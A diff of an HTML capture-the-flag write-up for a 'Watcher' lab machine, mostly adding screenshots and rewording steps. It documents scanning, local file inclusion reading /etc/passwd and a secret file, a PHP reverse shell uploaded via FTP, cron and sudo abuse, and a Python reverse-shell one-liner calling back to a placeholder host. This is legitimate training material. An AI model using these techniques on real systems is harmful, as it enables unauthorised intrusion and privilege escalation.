@@ -75,6 +75,7 @@
             <hr>
             <p>First, we begin with an nmap scan at the given IP (referred to later in commands/paths by "$IP").</p>
             <pre><code>sudo nmap -sV -sC -O -A $IP -oA nmapOutput -vv</code></pre>
+            <img src="img/WatcherScreenshots/nmapScan.png">
             <p>We find that the following ports are open:</p>
             <h4 id="nmap">NMap</h4>
             <ul>
@@ -82,9 +83,12 @@
             <li>Port open at 22/tcp for SSH OpenSSH 7.6p1 Ubuntu</li>
             <li>Port open at 80/tcp for HTTP Apache httpd 2.4.29</li>
             </ul>
-            <p>We can see that there's a webserver being run on port 80 (which we can confirm by viewing the ip in a browser). Thus, we can enumerate its directories using gobuster:</p>
+            <p>We can see that there's a webserver being run on port 80. We can confirm this by viewing the ip from a browser, which appears to show a shop for cork-based products.</p>
+            <img src="img/WatcherScreenshots/website1.png">
+            <p>Thus, we can enumerate its directories using gobuster:</p>
             <pre><code>gobuster dir -u http://$IP/ -o gobusterOutput.txt -w SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,js,css,py</code></pre>
             <h4 id="gobuster">Gobuster</h4>
+            <img src="img/WatcherScreenshots/gobusterScan.png">
             <ul>
             <li>$IP/images</li>
             <li>$IP/index.php</li>
@@ -95,23 +99,27 @@
             <li>$IP/bunch.php</li>
             <li>$IP/server-status</li>
             </ul>
-            <p>The hint tells us to look for a "robotstxt" file and we have found something similar. Opening <code>$IP/robots.txt</code> yields:</p>
+            <p>The hint tells us to look for a "robotstxt" file and we have found something similar. Opening <code>$IP/robots.txt</code> yields the following text:</p>
             <pre><code>
             User-<span class="hljs-string">agent:</span> *
             <span class="hljs-string">Allow:</span> /flag_1.txt
             <span class="hljs-string">Allow:</span> /secret_file_do_not_read.txt
             </code></pre><p>Which tells us that we can access these files at their respective
             directories. <code>$IP/flag_1.txt</code> returns the first flag:</p>
-            <pre><code>FLAG[REDACTED]
-            </code></pre><p>Which we can access with no problem. However, attempting to access <code>$IP/secret_file_do_not_read.txt</code> tells us that we
+            <img src="img/WatcherScreenshots/flag1.png">
+            <p>Which we can access with no problem. However, attempting to access <code>$IP/secret_file_do_not_read.txt</code> tells us that we
             don&#39;t have permission to access the resource.</p>
+            <img src="img/WatcherScreenshots/secret_file_access_attempt.png">
             <h4 id="web-investigation">Web Investigation</h4>
             <p>Clicking on one of the products on the webpage yields the following URL</p>
             <pre><code><span class="hljs-keyword">http</span>://$IP/<span class="hljs-built_in">post</span>.php?<span class="hljs-built_in">post</span>=striped.php</code></pre>
             <p>The next hint tells us that we want to exploit Local File Inclusion. Seeing as how this URL sends a POST request to display <code>striped.php</code>, we can try to use this to output other files. Let's test this with <code>robots.txt</code></p>
             </code></pre><p>Modifying this URL to</p>
             <pre><code><span class="hljs-keyword">http</span>://$IP/<span class="hljs-built_in">post</span>.php?<span class="hljs-built_in">post</span>=robots.txt
-            </code></pre><p>Dumps the contents of <code>robots.txt</code>. So now we know that we can use this to dump the
+            </code></pre>
+            <p>Dumps the contents of <code>robots.txt</code>.</p>
+            <img src="img/WatcherScreenshots/postRobots.png">
+            <p> So now we know that we can use this to dump the
             output of <code>secret_file_do_not_read.txt</code>:</p>
             <pre><code><span class="hljs-keyword">http</span>://$IP/<span class="hljs-built_in">post</span>.php?<span class="hljs-built_in">post</span>=secret_file_do_not_read.txt
             </code></pre><p>Which returns:</p>
@@ -127,9 +135,9 @@
             there is a directory called <code>files</code> and a file called <code>flag_2.txt</code>.
             Running</p>
             <pre><code><span class="hljs-keyword">get</span> flag_2.txt
-            </code></pre><p>Allows us to pull the file to our own machine and reveal the contents of the second flag to be:</p>
-            <pre><code><span class="xml">FLAG[REDACTED]
-            </code></pre><h3 id="reverse-shell">Reverse Shell</h3>
+            </code></pre><p>Allows us to pull the file to our own machine and reveal the contents of the second flag like so:</p>
+            <img src="img/WatcherScreenshots/ftpLogIn.png">
+            <h3 id="reverse-shell">Reverse Shell</h3>
             <p>We can initiate a reverse shell using the script <code>php-reverse-shell.php</code> from the following path:</p>
             <pre><code><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/webshells/</span>php<span class="hljs-regexp">/php-reverse-shell.php</span></code></pre>
             <p>Which we will need to modify to point to our host's IP and listening port.</p>
@@ -138,9 +146,13 @@
             </code></pre><p>Recall that the secret file we dumped earlier told us that files in the <code>ftp</code> server will be saved to <code>/home/ftpuser/ftp/files</code>. Knowing this we can attempt to find the root directory by moving back a lot of directories
             until <code>/etc/passwd</code> throws out an output.</p>
             <pre><code>http:<span class="hljs-regexp">//</span><span class="hljs-variable">$IP</span><span class="hljs-regexp">/post.php?post=../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd
-            </code></pre><p>(We end up having to go back 4 directories). Now knowing where the root directory is, we can specify the path to file we uploaded to the <code>ftp</code> server. Thus, we can call our reverse shell php script:</p>
-            <pre><code>http:<span class="hljs-regexp">//</span><span class="hljs-variable">$IP</span><span class="hljs-regexp">/post.php?post=../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/home/</span>ftpuser<span class="hljs-regexp">/ftp/</span>files<span class="hljs-regexp">/php-reverse-shell.php</span>
-            </code></pre><p>Now we can search for flags:</p>
+            </code></pre>
+            <img src="img/WatcherScreenshots/etcPasswdPost.png">
+            <p>(We end up having to go back 3 directories). Now knowing where the root directory is, we can specify the path to file we uploaded to the <code>ftp</code> server. Thus, we can call our reverse shell php script:</p>
+            <pre><code>http:<span class="hljs-regexp">//</span><span class="hljs-variable">$IP</span><span class="hljs-regexp">/post.php?post=../</span>../</span>..<span class="hljs-regexp">/home/</span>ftpuser<span class="hljs-regexp">/ftp/</span>files<span class="hljs-regexp">/php-reverse-shell.php</span>
+            </code></pre>
+            <img src="img/WatcherScreenshots/footholdReverseShell.png">
+            <p>Now we can search for flags:</p>
             <pre><code>find / -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">"*flag*"</span> <span class="hljs-number">2</span>&gt;/<span class="hljs-built_in">dev</span>/<span class="hljs-built_in">null</span>
             </code></pre><p>Which yields these interesting outputs</p>
             <pre><code>
@@ -154,7 +166,7 @@
             <span class="hljs-meta-keyword">/var/</span>www<span class="hljs-meta-keyword">/html/</span>flag_1.txt
             </code></pre>
             <p>We can <code>cat</code> the contents of <code>/var/www/html/more_secrets_a9f10a/flag_3.txt</code> to receive the third flag:</p> 
-            <pre><code>FLAG[REDACTED]</pre></code>
+            <img src="img/WatcherScreenshots/flag3.png">
             <h3 id="privilege-escalation">Privilege Escalation</h3>
             <p>We can stabilize our shell using:</p>
             <pre><code>
@@ -162,7 +174,9 @@
             <span class="hljs-keyword">export</span> TERM=xterm
             </code></pre><p>Then we background the shell with <code>Ctrl+Z</code> and run</p>
             <pre><code>stty raw -echo<span class="hljs-comment">; fg</span>
-            </code></pre><p>Once we do so, we can see that our user is <code>www-data@watcher</code> and we will
+            </code></pre>
+            <img src="img/WatcherScreenshots/stabilizingShell.png">
+            <p>Once we do so, we can see that our user is <code>www-data@watcher</code> and we will
             be able to use <code>vim</code>.
             Then we can check what permissions we do have with <code>sudo -l</code> which returns:</p>
             <pre><code>Matching Defaults entries <span class="hljs-keyword">for</span> www-data on <span class="hljs-symbol">watcher:</span>
@@ -174,8 +188,8 @@
             </code></pre><p>This tells us that we can <code>sudo</code> user <code>toby</code> without a password.</p>
             <pre><code><span class="hljs-selector-tag">sudo</span> <span class="hljs-selector-tag">-u</span> <span class="hljs-selector-tag">toby</span> <span class="hljs-selector-tag">cat</span> <span class="hljs-selector-tag">flag_4</span><span class="hljs-selector-class">.txt</span>
             </code></pre><p>Gives us the fourth flag:</p>
-            <pre><code><span class="xml">FLAG[REDACTED]
-            </code></pre><h3 id="cron-jobs">Cron Jobs</h3>
+            <img src="img/WatcherScreenshots/flag4.png">
+            <h3 id="cron-jobs">Cron Jobs</h3>
             <p><code>crontab -l</code> doesn&#39;t show any cron jobs for toby or the default user
             www-data@watcher.
             We can look for all stored cron jobs by running:</p>
@@ -203,11 +217,13 @@
             <pre><code>sudo -<span class="hljs-keyword">u</span> toby <span class="hljs-keyword">vim</span> cow.<span class="hljs-keyword">sh</span>
             </code></pre><p>and writing:</p>
             <pre><code>chmod <span class="hljs-number">777</span> /<span class="hljs-built_in">home</span>/mat/flag_5.txt
-            </code></pre><p>After the cron job runs, we can run:</p>
+            </code></pre>
+            <img src="img/WatcherScreenshots/cowShellEdit.png">
+            <p>After the cron job runs, we can run:</p>
             <pre><code><span class="hljs-keyword">cat</span> /home/<span class="hljs-keyword">mat</span>/flag_5.txt
             </code></pre><p>Which returns the fifth flag:</p>
-            <pre><code>FLAG[REDACTED]
-            </code></pre><h3 id="python-library-hijacking">Python Library Hijacking</h3>
+            <img src="img/WatcherScreenshots/flag5.png">
+            <h3 id="python-library-hijacking">Python Library Hijacking</h3>
             <p>Checking out the python3 scripts:</p>
             <pre><code>ls -artl /usr/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">python3</span>.6/</span>
             </code></pre><p>We find that we have write permission to none of these files.
@@ -219,25 +235,29 @@
             <pre><code>-rw-r--r-- 1 <span class="hljs-keyword">mat</span> <span class="hljs-keyword">mat</span> 133 <span class="hljs-keyword">Dec</span>  3 03:31 cmd.py
             </code></pre><p>However, because it is owned by user <code>mat</code> we can use our previous <code>cow.sh</code>
             script to change its permissions with:</p>
-            <pre><code>chmod <span class="hljs-number">777</span> <span class="hljs-regexp">/home/m</span>at<span class="hljs-regexp">/scripts/</span>cmd.py
-            </code></pre><p>This gives us write permissions so we can add the following payload from <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation#python-library-hijacking">HackTricks</a> to the <code>cmd.py</code> script.</p>
-            <pre><code>import <span class="hljs-keyword">socket</span>,subprocess,os;s=<span class="hljs-keyword">socket</span>.<span class="hljs-keyword">socket</span>(<span class="hljs-keyword">socket</span>.AF_INET,<span class="hljs-keyword">socket</span>.SOCK_STREAM);s.connect((<span class="hljs-string">"$IP"</span>,$PORT));os.dup2(s.fileno(),<span class="hljs-number">0</span>); os.dup2(s.fileno(),<span class="hljs-number">1</span>); os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">"/bin/sh"</span>,<span class="hljs-string">"-i"</span>]);
-            </code></pre><p>The <code>/home/mat/note.txt</code> reads:</p>
+            <pre><code>chmod <span class="hljs-number">777</span> <span class="hljs-regexp">/home/m</span>at<span class="hljs-regexp">/scripts/</span>cmd.py</code></pre>
+            <img src="img/WatcherScreenshots/cowShellCmd.png">
+            <p>This gives us write permissions so we can add the following reverse shell payload from <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation#python-library-hijacking">HackTricks</a> to the <code>cmd.py</code> script.</p>
+            <pre><code>import <span class="hljs-keyword">socket</span>,subprocess,os;s=<span class="hljs-keyword">socket</span>.<span class="hljs-keyword">socket</span>(<span class="hljs-keyword">socket</span>.AF_INET,<span class="hljs-keyword">socket</span>.SOCK_STREAM);s.connect((<span class="hljs-string">"$IP"</span>,$PORT));os.dup2(s.fileno(),<span class="hljs-number">0</span>); os.dup2(s.fileno(),<span class="hljs-number">1</span>); os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">"/bin/sh"</span>,<span class="hljs-string">"-i"</span>]);</code></pre>
+            <img src="img/WatcherScreenshots/cmdEdit1.png">
+            <p>The <code>/home/mat/note.txt</code> reads:</p>
             <pre><code>Hi Mat,
 
             I've <span class="hljs-keyword">set</span> up your sudo rights <span class="hljs-keyword">to</span> use <span class="hljs-keyword">the</span> python <span class="hljs-keyword">script</span> <span class="hljs-keyword">as</span> <span class="hljs-keyword">my</span> user. You can only <span class="hljs-built_in">run</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">script</span> <span class="hljs-keyword">with</span> sudo so <span class="hljs-keyword">it</span> should be safe.
 
             Will
             </code></pre><p>Which tells us that we can gain access to Will&#39;s credentials by sudoing the
-            script. So we modify the <code>cow.sh</code> script once again, adding:</p>
+            script. So we modify the <code>cow.sh</code> script once again. This time we'll by adding a line that will call <code>will_script.py</code>, activating our reverse shell. We can do so by adding:</p>
             <pre><code>sudo -<span class="hljs-keyword">u</span> will <span class="hljs-keyword">python3</span> /home/<span class="hljs-keyword">mat</span>/scripts/will_script.<span class="hljs-keyword">py</span> <span class="hljs-string">"test"</span>
-            </code></pre><p>We set up a listener with socat gets a shell as user <code>will</code> so we can catch the reverse shell.</p>
+            </code></pre>
+            <img src="img/WatcherScreenshots/cowShellWillScript.png">
+            <p>We set up a listener with socat gets a shell as user <code>will</code> so we can catch the reverse shell.</p>
             <pre><code>
             socat TCP-L:<span class="hljs-variable">$NEWPORT</span> -
             cat <span class="hljs-regexp">/home/</span>will<span class="hljs-regexp">/flag_6.txt</span>
             </code></pre><p>shows us the sixth flag:</p>
-            <pre><code><span class="xml">FLAG[REDACTED]
-            </code></pre><h3 id="ssh">SSH</h3>
+            <img src="img/WatcherScreenshots/flag6.png">
+            <h3 id="ssh">SSH</h3>
             <p>Recall that when we did the search for files with "flag" in its name, we did not find a seventh flag. This indicates that the seventh flag is in a directory that we did not have access to at the time, likely the root directory. However, we now have access to user <code>will</code>'s account, which may have different permissions.</p>
             </code></pre><p>Running <code>id</code> yields:</p>
             <pre><code>uid=<span class="hljs-number">1000</span><span class="hljs-comment">(will)</span> gid=<span class="hljs-number">1000</span><span class="hljs-comment">(will)</span> groups=<span class="hljs-number">1000</span><span class="hljs-comment">(will)</span>,<span class="hljs-number">4</span><span class="hljs-comment">(adm)</span>
@@ -263,9 +283,8 @@
             <pre><code>
             chmod <span class="hljs-number">700</span> id_rsa_flag
             ssh -<span class="hljs-selector-tag">i</span> id_rsa_flag root@<span class="hljs-variable">$IP</span>
-            </code></pre><p>In the root directory exists <code>flag_7.txt</code> which a quick <code>cat</code> gives us:</p>
-            <pre><code><span class="xml">FLAG[REDACTED]
-        </div>
+            </code></pre><p>In the root directory exists <code>flag_7.txt</code>, containing the final flag. We can access this with a quick <code>cat</code>:</p>
+            <img src="img/WatcherScreenshots/flag7.png">
       </div>
     </div>
   </article>
